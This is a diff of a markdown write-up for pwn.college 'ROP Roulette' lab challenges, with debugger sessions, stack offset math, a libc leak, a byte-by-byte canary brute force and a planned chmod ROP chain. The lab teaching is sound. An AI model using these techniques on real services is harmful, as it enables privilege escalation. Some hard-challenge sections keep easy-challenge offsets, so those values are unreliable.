 This challenge is listening for connections on TCP port 1337.
 
 The challenge supports unlimited sequential connections.
+
 ```
 
 We need the following:
@@ -12980,12 +12981,25 @@ Dump of assembler code for function challenge:
 End of assembler dump.
 ```
 
-Let's set a breakpoint at `challenge+212`, where the `read()` call is made. Connect with `nc localhost 1337` in a second terminal to trigger the fork and hit the breakpoint.
+Let's set a breakpoint at `challenge+212`, where the `read()` call is made. 
 
 ```
 pwndbg> break *(challenge+212)
 Breakpoint 1 at 0x285e
 ```
+
+```
+pwndbg> run
+Starting program: /challenge/rop-roulette-easy 
+###
+### Welcome to /challenge/rop-roulette-easy!
+###
+This challenge is listening for connections on TCP port 1337.
+The challenge supports unlimited sequential connections.
+
+```
+
+Connect with `nc localhost 1337` in a second terminal to trigger the fork and hit the breakpoint.
 
 ```
 pwndbg> run
@@ -13071,7 +13085,7 @@ $2 = 72
 - [x] Offset between buffer and stack canary: `56`
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the canary: `0x7ffdccee6290 - 8` = `0x7ffdccee6288`
-- [x] Offset between buffer and stored return address to `challenge()`: `72`
+- [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the stored return address: `0x7ffdccee6298`
 - [ ] Offsets of required Libc functions
@@ -13092,7 +13106,7 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ ROPgadget --binary /lib/
 - [x] Offset between buffer and stack canary: `56`
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the canary: `0x7ffdccee6288`
-- [x] Offset between buffer and stored return address to `challenge()`: `72`
+- [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the stored return address: `0x7ffdccee6298`
 - [ ] Offsets of required Libc functions
@@ -13118,7 +13132,7 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ readelf -s /lib/x86_64-l
 - [x] Offset between buffer and stack canary: `56`
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the canary: `0x7ffdccee6288`
-- [x] Offset between buffer and stored return address to `challenge()`: `72`
+- [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the stored return address: `0x7ffdccee6298`
 - [x] Offsets of required Libc functions
@@ -13130,9 +13144,29 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ readelf -s /lib/x86_64-l
 
 ### Leaking libc base and buf address
 
-There is no arbitrary read primitive in this challenge. Instead, by sending 168 bytes of `A`s we overwrite chain entries 1–12 but leave entry 13 at `buf+168` untouched, this is `main()`'s saved RIP = `__libc_start_main+243`, because that is who called `main()`. The chain printer prints it for us. The chain header also prints `rp_` which gives us `buf = rp_ - 72`.
+There is no arbitrary read primitive in this challenge. However, the chain printer prints every 8-byte value on the stack starting at `rp_` for as many entries as there are gadgets in our input. By sending 168 bytes of `A`s we overwrite entries 1–12 but leave entry 13 at `buf+168` untouched — `main()`'s saved RIP = `__libc_start_main+243`. The chain printer prints it back to us. The chain header also prints `rp_` which gives us `buf = rp_ - 72`.
 
-The saved RIP value comes from the backtrace:
+`rp_` is set by the binary as `rbp + 8` (from the disassembly at `challenge+128`). From the GDB session `rbp = 0x7ffdccee6290`, so `rp_ = 0x7ffdccee6298`:
+
+```
+pwndbg> p/d 0x7ffdccee6298 - 0x7ffdccee6250
+$2 = 72
+```
+
+`main()`'s saved RIP address comes from `info frame`:
+
+```
+called by frame at 0x7ffdccee6300
+```
+
+Its saved RIP sits at `0x7ffdccee6300 - 8 = 0x7ffdccee62f8`:
+
+```
+pwndbg> p/d 0x7ffdccee62f8 - 0x7ffdccee6250
+$3 = 168
+```
+
+So sending 168 bytes overwrites entries 1–12 (`buf+72` through `buf+167`) but leaves entry 13 (`buf+168`) untouched. From the backtrace that untouched value is `__libc_start_main+243`:
 
 ```
 2   0x7bb94ef0d083 __libc_start_main+243
@@ -13470,14 +13504,14 @@ pwn.college{UP5vZhPaAtVu_qG_L993WkbHfNH.01N2MDL4ITM0EzW}
 ## ROP Roulette (Hard)
 
 ```
-hacker@return-oriented-programming~rop-roulette-easy:~$ /challenge/rop-roulette-easy 
+hacker@return-oriented-programming~rop-roulette-hard:~$ /challenge/rop-roulette-hard 
 ###
-### Welcome to /challenge/rop-roulette-easy!
+### Welcome to /challenge/rop-roulette-hard!
 ###
 
-This challenge is listening for connections on TCP port 1337.
+This challenge is listening for connections on TCP port 1337. The challenge supports one connection at a time, but
+unlimited connections.
 
-The challenge supports unlimited sequential connections.
 ```
 
 We need the following:
@@ -13493,11 +13527,11 @@ Three problems to solve: canary, ASLR, and privilege. The server forks a child p
 
 #### Stage 1: Leak libc base and buf address
 
-Send 168 bytes of padding. This overwrites chain entries 1–12 (from `rp_` = `buf+72` through `buf+167`) with `0x41`, but leaves entry 13 at `buf+168` untouched. `buf+168` is exactly `main()`'s saved RIP = `__libc_start_main+243`. The chain printer prints all 13 entries, giving us the libc leak. The chain header also prints `rp_` which gives us `buf = rp_ - 72`.
+Unlike Guarded Gadgets, there is no arbitrary read primitive — we cannot simply ask the binary to read an address for us. Instead, we abuse the chain printer. By sending 168 bytes of padding we overwrite chain entries 1–12 but leave entry 13 at `buf+168` untouched. Entry 13 is `main()`'s saved RIP = `__libc_start_main+243`, which the chain printer then prints back to us. The chain header also prints `rp_`, giving us `buf = rp_ - 72`.
 
 #### Stage 2: Brute-force canary byte-by-byte
 
-The fork server reuses the same child process per connection, so the canary is fixed. Oracle: `### Goodbye!` at the end of output means `challenge()` returned cleanly (canary intact). No `### Goodbye!` means `__stack_chk_fail` killed the process before `main()` could print it.
+The fork server keeps the same canary across all connections. Oracle: `### Goodbye!` at the end of output means `challenge()` returned cleanly (canary intact). No `### Goodbye!` means `__stack_chk_fail` killed the process before `main()` could print it.
 
 #### Stage 3: Send `chmod` chain
 
@@ -13510,127 +13544,168 @@ With canary and libc base known, send the full exploit payload.
 ```
 pwndbg> disassemble challenge
 Dump of assembler code for function challenge:
-   0x000000000000278a <+0>:     endbr64
-   0x000000000000278e <+4>:     push   rbp
-   0x000000000000278f <+5>:     mov    rbp,rsp
-   0x0000000000002792 <+8>:     sub    rsp,0x70
-   0x0000000000002796 <+12>:    mov    DWORD PTR [rbp-0x54],edi
-   0x0000000000002799 <+15>:    mov    QWORD PTR [rbp-0x60],rsi
-   0x000000000000279d <+19>:    mov    QWORD PTR [rbp-0x68],rdx
-   0x00000000000027a1 <+23>:    mov    rax,QWORD PTR fs:0x28
-   0x00000000000027aa <+32>:    mov    QWORD PTR [rbp-0x8],rax
-   0x00000000000027ae <+36>:    xor    eax,eax
-
-# ---- snip ----
-
-   0x0000000000002806 <+124>:   add    rax,0x8
-   0x000000000000280a <+128>:   mov    QWORD PTR [rip+0x2847],rax        # 0x5058 <rp_>
-
-# ---- snip ----
-
-   0x000000000000285e <+212>:   call   0x1250 <read@plt>
-
-# ---- snip ----
-
-   0x0000000000002908 <+382>:   leave
-   0x0000000000002909 <+383>:   ret
+   0x00000000000014fb <+0>:     endbr64
+   0x00000000000014ff <+4>:     push   rbp
+   0x0000000000001500 <+5>:     mov    rbp,rsp
+   0x0000000000001503 <+8>:     add    rsp,0xffffffffffffff80
+   0x0000000000001507 <+12>:    mov    DWORD PTR [rbp-0x64],edi
+   0x000000000000150a <+15>:    mov    QWORD PTR [rbp-0x70],rsi
+   0x000000000000150e <+19>:    mov    QWORD PTR [rbp-0x78],rdx
+   0x0000000000001512 <+23>:    mov    rax,QWORD PTR fs:0x28
+   0x000000000000151b <+32>:    mov    QWORD PTR [rbp-0x8],rax
+   0x000000000000151f <+36>:    xor    eax,eax
+   0x0000000000001521 <+38>:    lea    rax,[rbp-0x50]
+   0x0000000000001525 <+42>:    mov    edx,0x1000
+   0x000000000000152a <+47>:    mov    rsi,rax
+   0x000000000000152d <+50>:    mov    edi,0x0
+   0x0000000000001532 <+55>:    call   0x11c0 <read@plt>
+   0x0000000000001537 <+60>:    mov    DWORD PTR [rbp-0x54],eax
+   0x000000000000153a <+63>:    lea    rdi,[rip+0xac7]        # 0x2008
+   0x0000000000001541 <+70>:    call   0x1150 <puts@plt>
+   0x0000000000001546 <+75>:    nop
+   0x0000000000001547 <+76>:    mov    rcx,QWORD PTR [rbp-0x8]
+   0x000000000000154b <+80>:    xor    rcx,QWORD PTR fs:0x28
+   0x0000000000001554 <+89>:    je     0x155b <challenge+96>
+   0x0000000000001556 <+91>:    call   0x1170 <__stack_chk_fail@plt>
+   0x000000000000155b <+96>:    leave
+   0x000000000000155c <+97>:    ret
 End of assembler dump.
 ```
 
-Let's set a breakpoint at `challenge+212`, where the `read()` call is made. Connect with `nc localhost 1337` in a second terminal to trigger the fork and hit the breakpoint.
+Let's set a breakpoint at `challenge+55`, where the `read()` call is made. Connect with `nc localhost 1337` in a second terminal to trigger the fork and hit the breakpoint.
 
 ```
-pwndbg> break *(challenge+212)
-Breakpoint 1 at 0x285e
+pwndbg> break *(challenge+55)
+Breakpoint 1 at 0x1532
 ```
 
 ```
 pwndbg> run
-Starting program: /challenge/rop-roulette-easy 
+Starting program: /challenge/rop-roulette-hard 
+Downloading separate debug info for system-supplied DSO at 0x7ffc87ffa000
+Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffc87ffa000.                                                                  
 ###
-### Welcome to /challenge/rop-roulette-easy!
+### Welcome to /challenge/rop-roulette-hard!
 ###
-This challenge is listening for connections on TCP port 1337.
-The challenge supports unlimited sequential connections.
 
-[Attaching after process 6200 fork to child process 6586]
-[New inferior 2 (process 6586)]
-[Detaching after fork from parent process 6200]
-[Switching to process 6586]
+This challenge is listening for connections on TCP port 1337. The challenge supports one connection at a time, but
+unlimited connections.
 
-Thread 2.1 "rop-roulette-ea" hit Breakpoint 1, 0x00005d08a200585e in challenge ()
+```
+
+Connect with `nc localhost 1337` in a second terminal to trigger the fork and hit the breakpoint.
+
+```
+pwndbg> run
+Starting program: /challenge/rop-roulette-hard 
+Downloading separate debug info for system-supplied DSO at 0x7ffc67f71000
+Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffc67f71000.                                                                  
+###
+### Welcome to /challenge/rop-roulette-hard!
+###
+
+This challenge is listening for connections on TCP port 1337. The challenge supports one connection at a time, but
+unlimited connections.
+
+[Attaching after process 3010 fork to child process 3107]
+[New inferior 2 (process 3107)]
+Downloading separate debug info for /challenge/rop-roulette-hard
+Download failed: Invalid argument.  Continuing without separate debug info for /challenge/rop-roulette-hard.                                                                           
+[Detaching after fork from parent process 3010]
+[Inferior 1 (process 3010) detached]
+Downloading separate debug info for system-supplied DSO at 0x7ffc67f71000
+Download failed: Invalid argument.  Continuing without separate debug info for system-supplied DSO at 0x7ffc67f71000.                                                                  
+[Switching to process 3107]
+
+Thread 2.1 "rop-roulette-ha" hit Breakpoint 1, 0x00005ad4a46fe532 in challenge ()
 LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────────────────────────────────────────────────────────[ LAST SIGNAL ]────────────────────────────────────────────────────────────────────────────────────
+Breakpoint hit at 0x5ad4a46fe532
 ────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
- RAX  0x7ffdccee6250 ◂— 0x39 /* '9' */
- RBX  0x5d08a2005b00 (__libc_csu_init) ◂— endbr64
- RCX  0x7bb94eff7297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+ RAX  0x7ffc67e1a2c0 ◂— 0
+ RBX  0x5ad4a46fe750 (__libc_csu_init) ◂— endbr64
+ RCX  0x7ffc67e1a468 —▸ 0x7ffc67e1ae8c ◂— '/challenge/rop-roulette-hard'
  RDX  0x1000
  RDI  0
- RSI  0x7ffdccee6250 ◂— 0x39 /* '9' */
- R8   0x4d
- R9   0x7bb94eee6740 ◂— 0x7bb94eee6740
- R10  0x7bb94eee6a10 ◂— 0x19ba
+ RSI  0x7ffc67e1a2c0 ◂— 0
+ R8   0
+ R9   0x7cf3a053e540 ◂— 0x7cf3a053e540
+ R10  0x7cf3a053e810 ◂— 0xc23 /* '#\x0c' */
  R11  0x246
- R12  0x5d08a2004320 (_start) ◂— endbr64
- R13  0x7ffdccee63e0 ◂— 1
+ R12  0x5ad4a46fe240 (_start) ◂— endbr64
+ R13  0x7ffc67e1a460 ◂— 1
  R14  0
  R15  0
- RBP  0x7ffdccee6290 —▸ 0x7ffdccee62f0 ◂— 0
- RSP  0x7ffdccee6220 —▸ 0x7bb94f0d66a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
- RIP  0x5d08a200585e (challenge+212) ◂— call read@plt
+ RBP  0x7ffc67e1a310 —▸ 0x7ffc67e1a370 ◂— 0
+ RSP  0x7ffc67e1a290 ◂— 0xd68 /* 'h\r' */
+ RIP  0x5ad4a46fe532 (challenge+55) ◂— call read@plt
 ─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
- ► 0x5d08a200585e <challenge+212>    call   read@plt                    <read@plt>
-        fd: 0 (socket:[1379219698])
-        buf: 0x7ffdccee6250 ◂— 0x39 /* '9' */
+ ► 0x5ad4a46fe532 <challenge+55>    call   read@plt                    <read@plt>
+        fd: 0 (socket:[1385737291])
+        buf: 0x7ffc67e1a2c0 ◂— 0
         nbytes: 0x1000
+ 
+   0x5ad4a46fe537 <challenge+60>    mov    dword ptr [rbp - 0x54], eax
+   0x5ad4a46fe53a <challenge+63>    lea    rdi, [rip + 0xac7]              RDI => 0x5ad4a46ff008 ◂— 'Leaving!'
+   0x5ad4a46fe541 <challenge+70>    call   puts@plt                    <puts@plt>
+ 
+   0x5ad4a46fe546 <challenge+75>    nop   
+   0x5ad4a46fe547 <challenge+76>    mov    rcx, qword ptr [rbp - 8]
+   0x5ad4a46fe54b <challenge+80>    xor    rcx, qword ptr fs:[0x28]
+   0x5ad4a46fe554 <challenge+89>    je     challenge+96                <challenge+96>
+ 
+   0x5ad4a46fe556 <challenge+91>    call   __stack_chk_fail@plt        <__stack_chk_fail@plt>
+ 
+   0x5ad4a46fe55b <challenge+96>    leave 
+   0x5ad4a46fe55c <challenge+97>    ret   
 ───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
-00:0000│ rsp     0x7ffdccee6220 —▸ 0x7bb94f0d66a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
-01:0008│-068     0x7ffdccee6228 —▸ 0x7ffdccee63f8 —▸ 0x7ffdccee7ea9 ◂— 'SHELL=/run/dojo/bin/bash'
-02:0010│-060     0x7ffdccee6230 —▸ 0x7ffdccee63e8 —▸ 0x7ffdccee7e8c ◂— '/challenge/rop-roulette-easy'
-03:0018│-058     0x7ffdccee6238 ◂— 0x14f0d24a0
-04:0020│-050     0x7ffdccee6240 ◂— 0
-05:0028│-048     0x7ffdccee6248 —▸ 0x7bb94ef79e93 (_IO_file_overflow+275) ◂— cmp eax, -1
-06:0030│ rax rsi 0x7ffdccee6250 ◂— 0x39 /* '9' */
-07:0038│-038     0x7ffdccee6258 —▸ 0x7bb94f0d66a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+00:0000│ rsp     0x7ffc67e1a290 ◂— 0xd68 /* 'h\r' */
+01:0008│-078     0x7ffc67e1a298 —▸ 0x7ffc67e1a478 —▸ 0x7ffc67e1aea9 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-070     0x7ffc67e1a2a0 —▸ 0x7ffc67e1a468 —▸ 0x7ffc67e1ae8c ◂— '/challenge/rop-roulette-hard'
+03:0018│-068     0x7ffc67e1a2a8 ◂— 0x1a46ff0a3
+04:0020│-060     0x7ffc67e1a2b0 —▸ 0x5ad4a4701010 (stdout@@GLIBC_2.2.5) —▸ 0x7cf3a05386a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+05:0028│-058     0x7ffc67e1a2b8 —▸ 0x7cf3a05344a0 (_IO_file_jumps) ◂— 0
+06:0030│ rax rsi 0x7ffc67e1a2c0 ◂— 0
+07:0038│-048     0x7ffc67e1a2c8 —▸ 0x7cf3a03dbe93 (_IO_file_overflow+275) ◂— cmp eax, -1
 ─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
- ► 0   0x5d08a200585e challenge+212
-   1   0x5d08a2005ad3 main+457
-   2   0x7bb94ef0d083 __libc_start_main+243
-   3   0x5d08a200434e _start+46
+ ► 0   0x5ad4a46fe532 challenge+55
+   1   0x5ad4a46fe726 main+457
+   2   0x7cf3a036f083 __libc_start_main+243
+   3   0x5ad4a46fe26e _start+46
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
 - [ ] Offset between buffer and stack canary
-   - Location of the buffer: `0x7ffdccee6250`
-- [ ] Offset between buffer and stored return address to `challenge()`
-   - Location of the buffer: `0x7ffdccee6250`
+   - Location of the buffer: `0x7ffc67e1a2c0`
+- [ ] Offset between buffer and stored return address to `main()`
+   - Location of the buffer: `0x7ffc67e1a2c0`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
 ```
 pwndbg> info frame
-Stack level 0, frame at 0x7ffdccee62a0:
- rip = 0x5d08a200585e in challenge; saved rip = 0x5d08a2005ad3
- called by frame at 0x7ffdccee6300
- Arglist at 0x7ffdccee6290, args: 
- Locals at 0x7ffdccee6290, Previous frame's sp is 0x7ffdccee62a0
+Stack level 0, frame at 0x7ffc67e1a320:
+ rip = 0x5ad4a46fe532 in challenge; saved rip = 0x5ad4a46fe726
+ called by frame at 0x7ffc67e1a380
+ Arglist at 0x7ffc67e1a310, args: 
+ Locals at 0x7ffc67e1a310, Previous frame's sp is 0x7ffc67e1a320
  Saved registers:
-  rbp at 0x7ffdccee6290, rip at 0x7ffdccee6298
+  rbp at 0x7ffc67e1a310, rip at 0x7ffc67e1a318
 ```
 
 ```
-pwndbg> p/d 0x7ffdccee6288 - 0x7ffdccee6250
-$1 = 56
-pwndbg> p/d 0x7ffdccee6298 - 0x7ffdccee6250
-$2 = 72
+pwndbg> p/d 0x7ffc67e1a308 - 0x7ffc67e1a2c0
+$1 = 72
+pwndbg> p/d 0x7ffc67e1a318 - 0x7ffc67e1a2c0
+$2 = 88
 ```
 
-- [x] Offset between buffer and stack canary: `56`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the canary: `0x7ffdccee6290 - 8` = `0x7ffdccee6288`
-- [x] Offset between buffer and stored return address to `challenge()`: `72`
-   - Location of the buffer: `0x7ffdccee6250`
-   - Location of the stored return address: `0x7ffdccee6298`
+- [x] Offset between buffer and stack canary: `76`
+   - Location of the buffer: `0x7ffc67e1a2c0`
+   - Location of the canary: `0x7ffc67e1a310 - 8` = `0x7ffc67e1a308`
+- [x] Offset between buffer and stored return address: `88`
+   - Location of the buffer: `0x7ffc67e1a2c0`
+   - Location of the stored return address: `0x7ffc67e1a318`
 - [ ] Offsets of required Libc functions
 - [ ] Locations of required ROP gadgets
 
@@ -13649,7 +13724,7 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ ROPgadget --binary /lib/
 - [x] Offset between buffer and stack canary: `56`
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the canary: `0x7ffdccee6288`
-- [x] Offset between buffer and stored return address to `challenge()`: `72`
+- [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the stored return address: `0x7ffdccee6298`
 - [ ] Offsets of required Libc functions
@@ -13675,7 +13750,7 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ readelf -s /lib/x86_64-l
 - [x] Offset between buffer and stack canary: `56`
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the canary: `0x7ffdccee6288`
-- [x] Offset between buffer and stored return address to `challenge()`: `72`
+- [x] Offset between buffer and stored return address: `72`
    - Location of the buffer: `0x7ffdccee6250`
    - Location of the stored return address: `0x7ffdccee6298`
 - [x] Offsets of required Libc functions
@@ -13687,7 +13762,7 @@ hacker@return-oriented-programming~rop-roulette-easy:~$ readelf -s /lib/x86_64-l
 
 ### Leaking libc base and buf address
 
-There is no arbitrary read primitive in this challenge. Instead, by sending 168 bytes of `A`s we overwrite chain entries 1–12 but leave entry 13 at `buf+168` untouched, this is `main()`'s saved RIP = `__libc_start_main+243`, because that is who called `main()`. The chain printer prints it for us. The chain header also prints `rp_` which gives us `buf = rp_ - 72`.
+There is no arbitrary read primitive in this challenge, unlike Guarded Gadgets where the binary asks "Address in hex to read from:". Instead, by sending 168 bytes of `A`s we overwrite chain entries 1–12 but leave entry 13 at `buf+168` untouched — this is `main()`'s saved RIP = `__libc_start_main+243`, because that is who called `main()`. The chain printer prints it back to us. The chain header also prints `rp_` which gives us `buf = rp_ - 72`.
 
 The saved RIP value comes from the backtrace:
 
@@ -13699,7 +13774,7 @@ Let's now find the offset of `__libc_start_main` within Libc.
 
 ```
 hacker@return-oriented-programming~rop-roulette-easy:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "__libc_start_main"
-   512: 0000000000023f90   392 FUNC    GLOBAL DEFAULT   15 __libc_start_main@@GLIBC_2.34
+512: 0000000000023f90   392 FUNC    GLOBAL DEFAULT   15 __libc_start_main@@GLIBC_2.34
 ```
 
 So, `__libc_start_main` is at an offset of `0x23f90` within Libc, therefore `__libc_start_main+243` is at offset `0x23f90 + 243 = 0x24083` within Libc.
@@ -13725,184 +13800,8 @@ chmod   = 0x7bb94eee9000 + 0x10dd80 = 0x7bb94eff6d80
 ```
 
 ### ROP chain
-#### Stage 1: Leaking libc base and buf address via chain printer
 
-```
-<== Value is stored at the address
-<-- Points to the address
-
-═══════════════════════════════════════════════════════════════════════════════════
-
-Stack:
-                           ┌───────────────────────────┐
-            0x7ffdccee6250 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 21 )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee6298 │  41 41 41 41 41 41 41 41  │ ( overwritten saved RIP )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-                      .... │  41 41 41 41 41 41 41 41  │ ( entries 2–12 overwritten )
-                      .... │  41 41 41 41 41 41 41 41  │ ....
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee62f8 │   __libc_start_main+243   │ ( entry 13, untouched )
-                           └───────────────────────────┘
-                           ╎  .. .. .. .. .. .. .. ..  ╎
-
-═══════════════════════════════════════════════════════════════════════════════════
-chain printer output:
-	+--- Printing 13 gadgets of ROP chain at 0x7ffdccee6298.
-	| 0x4141414141414141: (UNMAPPED MEMORY)   ← entries 1–12
-	| ...
-	| 0x7bb94ef0d083: ...                     ← entry 13 = lsm+243 → libc base
-	
-	buf   = rp_ - 72
-	libc_base = entry_13 - 0x24083
-═══════════════════════════════════════════════════════════════════════════════════
-```
-
-#### Stage 2: Leaking the canary byte-by-byte
-
-```
-<== Value is stored at the address
-<-- Points to the address
-
-═══════════════════════════════════════════════════════════════════════════════════
-
-Stack (correct byte):
-                           ┌───────────────────────────┐
-            0x7ffdccee6250 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 7 )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee6288 │  00 ?? ?? ?? ?? ?? ?? ??  │ ( known_canary + guess )
-                           └───────────────────────────┘
-                           ╎  .. .. .. .. .. .. .. ..  ╎
-
-═══════════════════════════════════════════════════════════════════════════════════
-correct byte  → canary intact → challenge() returns → main() prints ### Goodbye!
-wrong byte    → __stack_chk_fail kills process → ### Goodbye! never printed
-═══════════════════════════════════════════════════════════════════════════════════
-```
-
-#### Stage 3: Using leaked libc base to `chmod("!", 0o777)`
-
-```
-<== Value is stored at the address
-<-- Points to the address
-
-═══════════════════════════════════════════════════════════════════════════════════
-
-Stack:
-                           ┌───────────────────────────┐
-            0x7ffdccee6250 │  21 00 41 41 41 41 41 41  │ ( b"!\x00AAAAAA" )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-                      .... │  .. .. .. .. .. .. .. ..  │ ....
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee6288 │   canary                  │ ( brute-forced )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee6290 │  00 00 00 00 00 00 00 00  │ ( saved RBP )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-    rsp --> 0x7ffdccee6298 │   libc base + 0x23b6a     │ --> ( pop rdi ; ret )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee62a0 │   buf                     │ --> ( b"!\x00..." )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee62a8 │   libc base + 0x2601f     │ --> ( pop rsi ; ret )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee62b0 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee62b8 │   libc base + 0x10dd80    │ --> ( chmod in libc )
-                           └───────────────────────────┘
-                           ╎  .. .. .. .. .. .. .. ..  ╎
-
-═══════════════════════════════════════════════════════════════════════════════════
-rip --> challenge() return
-═══════════════════════════════════════════════════════════════════════════════════
-
-Stack:
-                           ┌───────────────────────────┐
-    rsp --> 0x7ffdccee62a0 │   buf                     │ --> ( b"!\x00..." )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee62a8 │   libc base + 0x2601f     │ --> ( pop rsi ; ret )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee62b0 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee62b8 │   libc base + 0x10dd80    │ --> ( chmod in libc )
-                           └───────────────────────────┘
-                           ╎  .. .. .. .. .. .. .. ..  ╎
-
-═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rdi ; ret
-═══════════════════════════════════════════════════════════════════════════════════
-
-Stack:
-                           ┌───────────────────────────┐
-    rsp --> 0x7ffdccee62a8 │   libc base + 0x2601f     │ --> ( pop rsi ; ret )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee62b0 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee62b8 │   libc base + 0x10dd80    │ --> ( chmod in libc )
-                           └───────────────────────────┘
-                           ╎  .. .. .. .. .. .. .. ..  ╎
-
-Registers:
-rdi: buf
-
-Function call setup:
-chmod("!")
-
-═══════════════════════════════════════════════════════════════════════════════════
-rip --> ret
-═══════════════════════════════════════════════════════════════════════════════════
-
-Stack:
-                           ┌───────────────────────────┐
-    rsp --> 0x7ffdccee62b0 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
-                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
-            0x7ffdccee62b8 │   libc base + 0x10dd80    │ --> ( chmod in libc )
-                           └───────────────────────────┘
-                           ╎  .. .. .. .. .. .. .. ..  ╎
-
-Registers:
-rdi: buf
-rsi: 0x1ff
-
-Function call setup:
-chmod("!", 0o777)
-
-═══════════════════════════════════════════════════════════════════════════════════
-rip --> pop rsi ; ret
-═══════════════════════════════════════════════════════════════════════════════════
-
-Stack:
-                           ┌───────────────────────────┐
-    rsp --> 0x7ffdccee62b8 │   libc base + 0x10dd80    │ --> ( chmod in libc )
-                           └───────────────────────────┘
-                           ╎  .. .. .. .. .. .. .. ..  ╎
-
-Registers:
-rdi: buf
-rsi: 0x1ff
-
-Function call setup:
-chmod("!", 0o777)
-
-═══════════════════════════════════════════════════════════════════════════════════
-rip --> ret
-═══════════════════════════════════════════════════════════════════════════════════
-
-Stack:
-                           ┌───────────────────────────┐
-    rsp --> 0x7ffdccee62c0 │  .. .. .. .. .. .. .. ..  │
-                           └───────────────────────────┘
-                           ╎  .. .. .. .. .. .. .. ..  ╎
-
-Registers:
-rdi: buf
-rsi: 0x1ff
-
-Function call setup:
-chmod("!", 0o777)
-
-═══════════════════════════════════════════════════════════════════════════════════
-rip --> chmod("!", 0o777)
-═══════════════════════════════════════════════════════════════════════════════════
-```
+The ROP chain would be the exact same as the [easy challenge](#rop-chain-4). 
 
 ### Exploit
 
